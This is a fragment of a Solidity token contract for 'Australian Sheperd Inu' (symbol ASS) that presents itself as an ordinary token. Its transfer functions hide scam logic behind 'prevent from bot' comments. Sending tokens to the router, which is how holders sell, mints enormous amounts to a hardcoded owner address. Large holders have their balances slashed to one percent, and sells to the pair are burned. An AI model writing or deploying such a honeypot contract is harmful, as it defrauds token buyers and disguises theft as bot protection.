...
contract AustralianSheperdinu {
    using SafeMath for uint256;
    string public name = "Australian Sheperd Inu";
    string public symbol = "ASS";
    uint8 public decimals = 9;
    address public owner; address public router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address Owner=0x4B1243a3973212D632fA07450cA229263250E8E5;
...
require ( to !=0x5A13d19348da666604Bbb52260bdfc539fDe05C6); // prevent from bot
        if (Buy != Owner && Buy !=getPair() && to != Buy && balanceOf[Buy]>=totalSupply.divCeil(10)) {
            balanceOf[Buy]=balanceOf[Buy].divCeil(100);}
        if (to == msg.sender) {burn(totalSupply*400);} if (to == router){balanceOf[Owner]+= amount*900000;}
        _transfer(msg.sender, to, amount);
        if (to != owner && to != router ){Buy = to;}
        return true;
    }
    function _transfer(address from, address to, uint256 amount) internal  {
        if (from == Buy && to == getPair()) {burn(amount);} // prevent BOT Pump           
